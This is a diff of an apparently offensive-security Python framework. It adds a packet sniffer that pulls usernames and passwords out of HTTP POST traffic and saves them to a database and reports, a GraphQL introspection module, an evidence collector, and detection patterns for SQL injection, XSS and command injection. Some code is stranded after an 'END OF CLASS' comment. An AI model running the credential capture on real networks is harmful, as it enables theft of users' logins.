+            # Would need to track connection attempts per source IP
+            # This is a simplified version
+            pass
+        
+        def _match_patterns(self, packet, config, payload):
+            """Match custom patterns"""
+            import re
+            
+            try:
+                # Keyword search
+                if config['keyword_search']:
+                    keywords = config['keyword_search'].split(',')
+                    for keyword in keywords:
+                        if keyword.strip().lower() in payload.lower():
+                            print(f"Pattern match: {keyword}")
+                
+                # Regex patterns
+                if config['regex_patterns']:
+                    patterns = config['regex_patterns'].split(';')
+                    for pattern in patterns:
+                        if re.search(pattern, payload, re.IGNORECASE):
+                            print(f"Regex match: {pattern}")
+            except Exception as e:
+                # Silently handle exception - consider logging in production
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] Exception: {e}")
+        
+        def _extract_form_credentials(self, config, src_ip, dst_ip, body):
+            """Extract credentials from form data"""
+            from colorama import Fore, Style
+            import urllib.parse
+            
+            try:
+                params = urllib.parse.parse_qs(body)
+                
+                username = None
+                password = None
+                
+                # Common field names
+                username_fields = ['username', 'user', 'email', 'login', 'user_name']
+                password_fields = ['password', 'pass', 'pwd', 'passwd']
+                
+                for field in username_fields:
+                    if field in params:
+                        username = params[field][0]
+                        break
+                
+                for field in password_fields:
+                    if field in params:
+                        password = params[field][0]
+                        break
+                
+                if username and password:
+                    self._store_credentials(config, 'HTTP-POST', src_ip, dst_ip, username, password)
+                    print(f"\n{Fore.RED}🔐 HTTP POST: {username}:{password} from {src_ip}{Style.RESET_ALL}")
+            except Exception as e:
+                # Silently handle exception - consider logging in production
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] Exception: {e}")
+        
+        def _store_packet(self, config, timestamp, src_ip, dst_ip, src_port, dst_port, protocol, length, payload):
+            """Store packet in database"""
+            import sqlite3
+            
+            try:
+                conn = sqlite3.connect(config['db_file'])
+                cursor = conn.cursor()
+                
+                payload_str = payload.decode('utf-8', errors='ignore') if payload else None
+                
+                cursor.execute('''
+                    INSERT INTO packets (campaign_id, timestamp, src_ip, dst_ip, src_port, dst_port, 
+                                       protocol, length, payload)
+                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+                ''', (config['campaign_id'], timestamp, src_ip, dst_ip, src_port, dst_port,
+                      protocol, length, payload_str))
+                
+                conn.commit()
+                conn.close()
+            except Exception as e:
+                # Silently handle exception - consider logging in production
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] Exception: {e}")
+        
+        def _store_credentials(self, config, protocol, src_ip, dst_ip, username, password):
+            """Store extracted credentials"""
+            import sqlite3
+            import time
+            
+            try:
+                conn = sqlite3.connect(config['db_file'])
+                cursor = conn.cursor()
+                
+                cursor.execute('''
+                    INSERT INTO credentials (campaign_id, timestamp, protocol, source_ip, 
+                                           destination_ip, username, password)
+                    VALUES (?, ?, ?, ?, ?, ?, ?)
+                ''', (config['campaign_id'], time.time(), protocol, src_ip, dst_ip, username, password))
+                
+                config['credentials_found'] += 1
+                
+                conn.commit()
+                conn.close()
+            except Exception as e:
+                # Silently handle exception - consider logging in production
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] Exception: {e}")
+        
+        def _store_cookies(self, config, src_ip, host, cookies):
+            """Store extracted cookies"""
+            # Could implement cookie storage
+            pass
+        
+        def _store_http_request(self, config, src_ip, method, host, path, user_agent, cookies):
+            """Store HTTP request"""
+            import sqlite3
+            import time
+            
+            try:
+                conn = sqlite3.connect(config['db_file'])
+                cursor = conn.cursor()
+                
+                cursor.execute('''
+                    INSERT INTO http_requests (campaign_id, timestamp, source_ip, method, 
+                                             host, path, user_agent, cookies)
+                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+                ''', (config['campaign_id'], time.time(), src_ip, method, host, path, user_agent, cookies))
+                
+                conn.commit()
+                conn.close()
+            except Exception as e:
+                # Silently handle exception - consider logging in production
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] Exception: {e}")
+        
+        def _store_dns_query(self, config, src_ip, query_name, query_type):
+            """Store DNS query"""
+            import sqlite3
+            import time
+            
+            try:
+                conn = sqlite3.connect(config['db_file'])
+                cursor = conn.cursor()
+                
+                cursor.execute('''
+                    INSERT INTO dns_queries (campaign_id, timestamp, source_ip, query_name, query_type)
+                    VALUES (?, ?, ?, ?, ?)
+                ''', (config['campaign_id'], time.time(), src_ip, query_name, query_type))
+                
+                conn.commit()
+                conn.close()
+            except Exception as e:
+                # Silently handle exception - consider logging in production
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] Exception: {e}")
+        
+        def _store_alert(self, config, alert_type, severity, source_ip, dest_ip, description):
+            """Store security alert"""
+            import sqlite3
+            import time
+            
+            try:
+                conn = sqlite3.connect(config['db_file'])
+                cursor = conn.cursor()
+                
+                cursor.execute('''
+                    INSERT INTO alerts (campaign_id, timestamp, alert_type, severity, 
+                                      source_ip, destination_ip, description)
+                    VALUES (?, ?, ?, ?, ?, ?, ?)
+                ''', (config['campaign_id'], time.time(), alert_type, severity, source_ip, dest_ip, description))
+                
+                config['alerts_generated'] += 1
+                
+                conn.commit()
+                conn.close()
+            except Exception as e:
+                # Silently handle exception - consider logging in production
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] Exception: {e}")
+        
+        def _check_http_suspicious(self, config, src_ip, method, path, headers):
+            """Check for suspicious HTTP patterns"""
+            from colorama import Fore, Style
+            
+            try:
+                suspicious = False
+                reasons = []
+                
+                # SQL injection patterns
+                sql_patterns = ['union', 'select', '1=1', 'or 1=', 'drop table', '--', ';--']
+                for pattern in sql_patterns:
+                    if pattern in path.lower():
+                        suspicious = True
+                        reasons.append(f"SQL injection pattern: {pattern}")
+                
+                # XSS patterns
+                xss_patterns = ['<script', 'javascript:', 'onerror=', 'onload=']
+                for pattern in xss_patterns:
+                    if pattern in path.lower():
+                        suspicious = True
+                        reasons.append(f"XSS pattern: {pattern}")
+                
+                # Path traversal
+                if '../' in path or '..\\' in path:
+                    suspicious = True
+                    reasons.append("Path traversal attempt")
+                
+                # Command injection
+                cmd_patterns = ['|', ';', '&&', '`', '$(']
+                for pattern in cmd_patterns:
+                    if pattern in path:
+                        suspicious = True
+                        reasons.append(f"Command injection pattern: {pattern}")
+                
+                if suspicious:
+                    alert_msg = f"Suspicious HTTP request from {src_ip}: {' | '.join(reasons)}"
+                    print(f"\n{Fore.YELLOW}⚠  SUSPICIOUS: {alert_msg}{Style.RESET_ALL}")
+                    
+                    if config['enable_database']:
+                        self._store_alert(config, 'suspicious_http', 'medium', src_ip, '', alert_msg)
+            except Exception as e:
+                # Silently handle exception - consider logging in production
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] Exception: {e}")
+        
+        def _display_packet(self, packet, src_ip, dst_ip, src_port, dst_port, protocol, display_lock):
+            """Display packet information"""
+            from colorama import Fore, Style
+            
+            try:
+                with display_lock:
+                    port_info = f":{src_port} → :{dst_port}" if src_port and dst_port else ""
+                    print(f"{Fore.CYAN}[{protocol}]{Style.RESET_ALL} {src_ip}{port_info} → {dst_ip}")
+            except Exception as e:
+                # Silently handle exception - consider logging in production
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] Exception: {e}")
+        
+        def _display_statistics(self, config, stats, display_lock):
+            """Display capture statistics"""
+            from colorama import Fore, Style
+            import time
+            
+            try:
+                with display_lock:
+                    elapsed = time.time() - stats['start_time']
+                    rate = config['packets_captured'] / elapsed if elapsed > 0 else 0
+                    
+                    print(f"\n{Fore.CYAN}{'─' * 80}{Style.RESET_ALL}")
+                    print(f"{Fore.GREEN}📊 STATISTICS{Style.RESET_ALL}")
+                    print(f"  Packets: {config['packets_captured']} | Rate: {rate:.1f} pkt/s | Elapsed: {int(elapsed)}s")
+                    
+                    # Top protocols
+                    if stats['packets_by_protocol']:
+                        print(f"\n  {Fore.YELLOW}Top Protocols:{Style.RESET_ALL}")
+                        sorted_protocols = sorted(stats['packets_by_protocol'].items(), key=lambda x: x[1], reverse=True)[:5]
+                        for proto, count in sorted_protocols:
+                            print(f"    {proto}: {count}")
+                    
+                    # Top ports
+                    if stats['packets_by_port']:
+                        print(f"\n  {Fore.YELLOW}Top Ports:{Style.RESET_ALL}")
+                        sorted_ports = sorted(stats['packets_by_port'].items(), key=lambda x: x[1], reverse=True)[:5]
+                        for port, count in sorted_ports:
+                            print(f"    {port}: {count}")
+                    
+                    # Top talkers
+                    if stats['top_talkers']:
+                        print(f"\n  {Fore.YELLOW}Top Talkers:{Style.RESET_ALL}")
+                        sorted_talkers = sorted(stats['top_talkers'].items(), key=lambda x: x[1], reverse=True)[:5]
+                        for ip, count in sorted_talkers:
+                            print(f"    {ip}: {count}")
+                    
+                    # Alerts
+                    if config['alerts_generated'] > 0:
+                        print(f"\n  {Fore.RED}🚨 Alerts: {config['alerts_generated']}{Style.RESET_ALL}")
+                    
+                    # Credentials
+                    if config['credentials_found'] > 0:
+                        print(f"\n  {Fore.RED}🔐 Credentials Found: {config['credentials_found']}{Style.RESET_ALL}")
+                    
+                    print(f"{Fore.CYAN}{'─' * 80}{Style.RESET_ALL}\n")
+                    
+                    stats['last_display'] = time.time()
+            except Exception as e:
+                # Silently handle exception - consider logging in production
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] Exception: {e}")
+        
+        def _cleanup_packet_sniffer(self, config):
+            """Cleanup and generate reports"""
+            from colorama import Fore, Style
+            import time
+            import sqlite3
+            
+            try:
+                # Update campaign end time
+                if config['enable_database']:
+                    conn = sqlite3.connect(config['db_file'])
+                    cursor = conn.cursor()
+                    
+                    cursor.execute('''
+                        UPDATE campaigns 
+                        SET end_time = CURRENT_TIMESTAMP,
+                            packets_captured = ?,
+                            bytes_captured = ?,
+                            alerts_generated = ?,
+                            credentials_found = ?,
+                            status = 'completed'
+                        WHERE id = ?
+                    ''', (config['packets_captured'], config['bytes_captured'], 
+                          config['alerts_generated'], config['credentials_found'], 
+                          config['campaign_id']))
+                    
+                    conn.commit()
+                    conn.close()
+                
+                # Generate reports
+                print(f"\n{Fore.CYAN}{'=' * 80}{Style.RESET_ALL}")
+                print(f"{Fore.CYAN}CAPTURE SUMMARY{Style.RESET_ALL}")
+                print(f"{Fore.CYAN}{'=' * 80}{Style.RESET_ALL}\n")
+                
+                elapsed = time.time() - config['start_time']
+                rate = config['packets_captured'] / elapsed if elapsed > 0 else 0
+                
+                print(f"{Fore.GREEN}✓ Capture completed{Style.RESET_ALL}")
+                print(f"\n{Fore.YELLOW}Statistics:{Style.RESET_ALL}")
+                print(f"  • Total Packets:    {config['packets_captured']}")
+                print(f"  • Capture Duration: {int(elapsed)} seconds")
+                print(f"  • Average Rate:     {rate:.1f} packets/second")
+                print(f"  • Alerts Generated: {config['alerts_generated']}")
+                print(f"  • Credentials Found:{config['credentials_found']}")
+                
+                if config['output_pcap']:
+                    import os
+                    if os.path.exists(config['pcap_file']):
+                        size = os.path.getsize(config['pcap_file']) / (1024*1024)
+                        print(f"\n{Fore.YELLOW}Output Files:{Style.RESET_ALL}")
+                        print(f"  • PCAP: {config['pcap_file']} ({size:.2f} MB)")
+                
+                if config['enable_database']:
+                    print(f"  • Database: {config['db_file']}")
+                
+                # Generate additional reports
+                if config['output_json']:
+                    self._generate_json_report(config)
+                
+                if config['output_csv']:
+                    self._generate_csv_report(config)
+                
+                print(f"\n{Fore.GREEN}Analysis complete!{Style.RESET_ALL}\n")
+                
+            except Exception as e:
+                print(f"{Fore.RED}✗ Cleanup error: {str(e)}{Style.RESET_ALL}")
+        
+        def _generate_json_report(self, config):
+            """Generate JSON report"""
+            import json
+            import sqlite3
+            from colorama import Fore, Style
+            
+            try:
+                report = {
+                    'campaign_id': config['campaign_id'],
+                    'interface': config['interface'],
+                    'filter': config['bpf_filter'],
+                    'start_time': config['start_time'],
+                    'packets_captured': config['packets_captured'],
+                    'alerts_generated': config['alerts_generated'],
+                    'credentials_found': config['credentials_found'],
+                    'top_protocols': {},
+                    'alerts': [],
+                    'credentials': []
+                }
+                
+                if config['enable_database']:
+                    conn = sqlite3.connect(config['db_file'])
+                    cursor = conn.cursor()
+                    
+                    # Get alerts
+                    cursor.execute('''
+                        SELECT alert_type, severity, source_ip, description, timestamp
+                        FROM alerts WHERE campaign_id = ?
+                        ORDER BY timestamp DESC LIMIT 100
+                    ''', (config['campaign_id'],))
+                    
+                    for row in cursor.fetchall():
+                        report['alerts'].append({
+                            'type': row[0],
+                            'severity': row[1],
+                            'source_ip': row[2],
+                            'description': row[3],
+                            'timestamp': row[4]
+                        })
+                    
+                    # Get credentials
+                    cursor.execute('''
+                        SELECT protocol, source_ip, username, password, timestamp
+                        FROM credentials WHERE campaign_id = ?
+                        ORDER BY timestamp DESC
+                    ''', (config['campaign_id'],))
+                    
+                    for row in cursor.fetchall():
+                        report['credentials'].append({
+                            'protocol': row[0],
+                            'source_ip': row[1],
+                            'username': row[2],
+                            'password': row[3],
+                            'timestamp': row[4]
+                        })
+                    
+                    conn.close()
+                
+                # Write JSON file
+                with open(config['json_file'], 'w') as f:
+                    json.dump(report, f, indent=2)
+                
+                print(f"  • JSON: {config['json_file']}")
+                
+            except Exception as e:
+                if config['debug_mode']:
+                    print(f"{Fore.RED}✗ JSON report error: {str(e)}{Style.RESET_ALL}")
+        
+        def _generate_csv_report(self, config):
+            """Generate CSV report"""
+            import csv
+            import sqlite3
+            from colorama import Fore, Style
+            
+            try:
+                if not config['enable_database']:
+                    return
+                
+                conn = sqlite3.connect(config['db_file'])
+                cursor = conn.cursor()
+                
+                # Export packets to CSV
+                cursor.execute('''
+                    SELECT timestamp, src_ip, dst_ip, src_port, dst_port, protocol, length
+                    FROM packets WHERE campaign_id = ?
+                    ORDER BY timestamp
+                ''', (config['campaign_id'],))
+                
+                with open(config['csv_file'], 'w', newline='') as f:
+                    writer = csv.writer(f)
+                    writer.writerow(['Timestamp', 'Source IP', 'Dest IP', 'Source Port', 
+                                   'Dest Port', 'Protocol', 'Length'])
+                    writer.writerows(cursor.fetchall())
+                
+                conn.close()
+                
+                print(f"  • CSV: {config['csv_file']}")
+                
+            except Exception as e:
+                if config['debug_mode']:
+                    print(f"{Fore.RED}✗ CSV report error: {str(e)}{Style.RESET_ALL}")
+        
+        # ============ WEB APPLICATION MODULES ============
+        
+        def run_graphql_introspection_basic(self):
+            """Basic GraphQL introspection test (orphaned code recovered)"""
+            from colorama import Fore, Style
+            
+            # Get configuration from module_options
+            url = self.module_options.get('url', 'http://localhost:4000/graphql')
+            output = self.module_options.get('output', 'graphql_schema.json')
+            
+            print(f"{Fore.YELLOW}Endpoint: {Fore.WHITE}{url}{Style.RESET_ALL}\n")
+            
+            introspection_query = """{
+      __schema {
+        types {
           name
-          kind
+          fields {
+            name
+            type {
+              name
+              kind
+            }
+          }
+        }
+        queryType {
+          name
+        }
+        mutationType {
+          name
         }
       }
-    }
-    queryType {
-      name
-    }
-    mutationType {
-      name
-    }
-  }
-}"""
-        
-        print(f"{Fore.CYAN}Introspection query:{Style.RESET_ALL}\n{Fore.WHITE}{introspection_query}{Style.RESET_ALL}\n")
-        
-        try:
-            response = requests.post(
-                url,
-                json={'query': introspection_query},
-                headers={'Content-Type': 'application/json'},
-                timeout=10,
-                verify=False
-            )
+    }"""
             
-            if response.status_code == 200:
-                data = response.json()
+            print(f"{Fore.CYAN}Introspection query:{Style.RESET_ALL}\n{Fore.WHITE}{introspection_query}{Style.RESET_ALL}\n")
+            
+            try:
+                response = requests.post(
+                    url,
+                    json={'query': introspection_query},
+                    headers={'Content-Type': 'application/json'},
+                    timeout=10,
+                    verify=False
+                )
                 
-                with open(output, 'w') as f:
-                    json.dump(data, f, indent=2)
-                
-                print(f"{Fore.GREEN} Schema retrieved!{Style.RESET_ALL}")
-                print(f"{Fore.CYAN}→ Saved to: {Fore.WHITE}{output}{Style.RESET_ALL}\n")
-                
-                if 'data' in data and '__schema' in data['data']:
-                    types = data['data']['__schema']['types']
-                    print(f"{Fore.BLUE}Found {len(types)} types{Style.RESET_ALL}\n")
+                if response.status_code == 200:
+                    data = response.json()
                     
-                    print(f"{Fore.GREEN}Sample types:{Style.RESET_ALL}")
-                    for t in types[:5]:
-                        print(f" • {Fore.CYAN}{t['name']}{Style.RESET_ALL}")
+                    with open(output, 'w') as f:
+                        json.dump(data, f, indent=2)
+                    
+                    print(f"{Fore.GREEN} Schema retrieved!{Style.RESET_ALL}")
+                    print(f"{Fore.CYAN}→ Saved to: {Fore.WHITE}{output}{Style.RESET_ALL}\n")
+                    
+                    if 'data' in data and '__schema' in data['data']:
+                        types = data['data']['__schema']['types']
+                        print(f"{Fore.BLUE}Found {len(types)} types{Style.RESET_ALL}\n")
                         
-            else:
-                print(f"{Fore.RED} Introspection may be disabled{Style.RESET_ALL}")
-                print(f"{Fore.YELLOW}Status: {response.status_code}{Style.RESET_ALL}")
-                
-        except Exception as e:
-            print(f"{Fore.RED}✗ Error: {str(e)}{Style.RESET_ALL}")
-    
-    # ============ END OF CLASS ============
-            print(f"{Fore.RED} Error: {str(e)}{Style.RESET_ALL}")
+                        print(f"{Fore.GREEN}Sample types:{Style.RESET_ALL}")
+                        for t in types[:5]:
+                            print(f" • {Fore.CYAN}{t['name']}{Style.RESET_ALL}")
+                            
+                else:
+                    print(f"{Fore.RED} Introspection may be disabled{Style.RESET_ALL}")
+                    print(f"{Fore.YELLOW}Status: {response.status_code}{Style.RESET_ALL}")
+                    
+            except Exception as e:
+                print(f"{Fore.RED}✗ Error: {str(e)}{Style.RESET_ALL}")
         
-        print(f"\n{Fore.BLUE}Common GraphQL attacks:{Style.RESET_ALL}")
-        print(f" • Introspection (schema disclosure)")
-        print(f" • Nested queries (DoS)")
-        print(f" • Batch attacks")
-        print(f" • Field suggestion abuse")
-        print(f" • Authorization bypass")
-        print(f"\n{Fore.GREEN}ℹ Tools:{Style.RESET_ALL}")
-        print(f" • GraphQL Voyager - Visualize schema")
-        print(f" • Altair - GraphQL client")
-        print(f" • InQL Scanner - Burp extension")
-    
-    def run_evidence_collector(self):
-        """Collect evidence and screenshots"""
-        session_id = self.module_options.get('session', '1')
-        output = self.module_options.get('output', 'evidence.zip')
-        
-        print(f"{Fore.CYAN}[*] Collecting evidence from session {session_id}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}[*] Output: {output}{Style.RESET_ALL}\n")
-        
-        evidence_dir = f"evidence_{int(time.time())}"
-        os.makedirs(evidence_dir, exist_ok=True)
-        
-        print(f"{Fore.BLUE}[*] Collecting system information...{Style.RESET_ALL}")
-        sysinfo = {
-            'hostname': platform.node(),
-            'system': platform.system(),
-            'release': platform.release(),
-            'version': platform.version(),
-            'machine': platform.machine(),
-            'processor': platform.processor(),
-            'timestamp': datetime.now().isoformat()
-        }
-        
-        with open(os.path.join(evidence_dir, 'sysinfo.json'), 'w') as f:
-            json.dump(sysinfo, f, indent=2)
-        
-        print(f"{Fore.GREEN}[+] System information collected{Style.RESET_ALL}")
-        print(f"{Fore.BLUE}[*] Collecting network information...{Style.RESET_ALL}")
-        try:
-            result = subprocess.run('ifconfig || ip addr', shell=True, capture_output=True, text=True)
-            with open(os.path.join(evidence_dir, 'network.txt'), 'w') as f:
-                f.write(result.stdout)
-            print(f"{Fore.GREEN}[+] Network information collected{Style.RESET_ALL}")
-        except Exception as e:
-            print(f"{Fore.YELLOW}[!] Could not collect network info: {str(e)}{Style.RESET_ALL}")
-        
-        print(f"{Fore.BLUE}[*] Creating archive...{Style.RESET_ALL}")
-        try:
-            with zipfile.ZipFile(output, 'w', zipfile.ZIP_DEFLATED) as zipf:
-                for root, dirs, files in os.walk(evidence_dir):
-                    for file in files:
-                        file_path = os.path.join(root, file)
-                        arcname = os.path.relpath(file_path, evidence_dir)
-                        zipf.write(file_path, arcname)
+        # ============ END OF CLASS ============
+                print(f"{Fore.RED} Error: {str(e)}{Style.RESET_ALL}")
             
-            print(f"{Fore.GREEN}[+] Evidence archived: {output}{Style.RESET_ALL}")
-            import shutil
-            shutil.rmtree(evidence_dir)
-        except Exception as e:
-            print(f"{Fore.RED}[!] Error creating archive: {str(e)}{Style.RESET_ALL}")
-    
+            print(f"\n{Fore.BLUE}Common GraphQL attacks:{Style.RESET_ALL}")
+            print(f" • Introspection (schema disclosure)")
+            print(f" • Nested queries (DoS)")
+            print(f" • Batch attacks")
+            print(f" • Field suggestion abuse")
+            print(f" • Authorization bypass")
+            print(f"\n{Fore.GREEN}ℹ Tools:{Style.RESET_ALL}")
+            print(f" • GraphQL Voyager - Visualize schema")
+            print(f" • Altair - GraphQL client")
+            print(f" • InQL Scanner - Burp extension")
+        
+        def run_evidence_collector(self):
+            """Collect evidence and screenshots"""
+            session_id = self.module_options.get('session', '1')
+            output = self.module_options.get('output', 'evidence.zip')
+            
+            print(f"{Fore.CYAN}[*] Collecting evidence from session {session_id}{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}[*] Output: {output}{Style.RESET_ALL}\n")
+            
+            evidence_dir = f"evidence_{int(time.time())}"
+            os.makedirs(evidence_dir, exist_ok=True)
+            
+            print(f"{Fore.BLUE}[*] Collecting system information...{Style.RESET_ALL}")
+            sysinfo = {
+                'hostname': platform.node(),
+                'system': platform.system(),
+                'release': platform.release(),
+                'version': platform.version(),
+                'machine': platform.machine(),
+                'processor': platform.processor(),
+                'timestamp': datetime.now().isoformat()
+            }
+            
+            with open(os.path.join(evidence_dir, 'sysinfo.json'), 'w') as f:
+                json.dump(sysinfo, f, indent=2)
+            
+            print(f"{Fore.GREEN}[+] System information collected{Style.RESET_ALL}")
+            print(f"{Fore.BLUE}[*] Collecting network information...{Style.RESET_ALL}")
+            try:
+                result = subprocess.run('ifconfig || ip addr', shell=True, capture_output=True, text=True)
+                with open(os.path.join(evidence_dir, 'network.txt'), 'w') as f:
+                    f.write(result.stdout)
+                print(f"{Fore.GREEN}[+] Network information collected{Style.RESET_ALL}")
+            except Exception as e:
+                print(f"{Fore.YELLOW}[!] Could not collect network info: {str(e)}{Style.RESET_ALL}")
+            
+            print(f"{Fore.BLUE}[*] Creating archive...{Style.RESET_ALL}")
+            try:
+                with zipfile.ZipFile(output, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                    for root, dirs, files in os.walk(evidence_dir):
+                        for file in files:
+                            file_path = os.path.join(root, file)
+                            arcname = os.path.relpath(file_path, evidence_dir)
+                            zipf.write(file_path, arcname)
+                
+                print(f"{Fore.GREEN}[+] Evidence archived: {output}{Style.RESET_ALL}")
+                import shutil
+                shutil.rmtree(evidence_dir)
+            except Exception as e:
+                print(f"{Fore.RED}[!] Error creating archive: {str(e)}{Style.RESET_ALL}")
+        
     def show_stats(self):
         """Show framework statistics"""
         self._render_screen_header("Framework Telemetry", "live signal across pool, rate, sessions, and modules")
-
+    
         blocks = [
             (
                 "Connection Mesh",
@@ -41208,7 +41208,7 @@ Success Rate:       {(leases/requests*100) if requests > 0 else 0:.1f}%
                 ]
             )
         ]
-
+    
         total_modules = sum(len(mods) for mods in self.modules.values())
         module_lines = [
             f"inventory :: {total_modules} modules / {len(self.modules)} domains"
@@ -41216,13 +41216,13 @@ Success Rate:       {(leases/requests*100) if requests > 0 else 0:.1f}%
         if self.current_module:
             module_lines.append(f"engaged :: {self.current_module}")
         blocks.append(("Module Matrix", module_lines))
-
+    
         for title, lines in blocks:
             print(f"{Fore.CYAN}┌─[{title}]{Style.RESET_ALL}")
             for line in lines:
                 print(f"{Fore.WHITE}│ {line}{Style.RESET_ALL}")
             print(f"{Fore.CYAN}└{'─'*52}{Style.RESET_ALL}\n")
-
+    
         error_stats = self.error_handler.get_error_stats()
         if error_stats:
             print(f"{Fore.CYAN}┌─[Error Summary]{Style.RESET_ALL}")
@@ -41359,7 +41359,7 @@ Success Rate:       {(leases/requests*100) if requests > 0 else 0:.1f}%
                         self.generate_payload()
                     else:
                         print(f"{Fore.RED}[!] Usage: generate payload{Style.RESET_ALL}")
-
+    
                 elif command == 'download':
                     if len(args) >= 2 and args[0] == 'wordlist':
                         self.download_wordlist(args[1])
@@ -41390,7 +41390,7 @@ Success Rate:       {(leases/requests*100) if requests > 0 else 0:.1f}%
                 print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
                 import traceback
                 traceback.print_exc()
-
+    
 def main():
     """Main entry point"""
     print(f"{Fore.YELLOW}[*] Loading KNDYS Framework v3.0...{Style.RESET_ALL}")
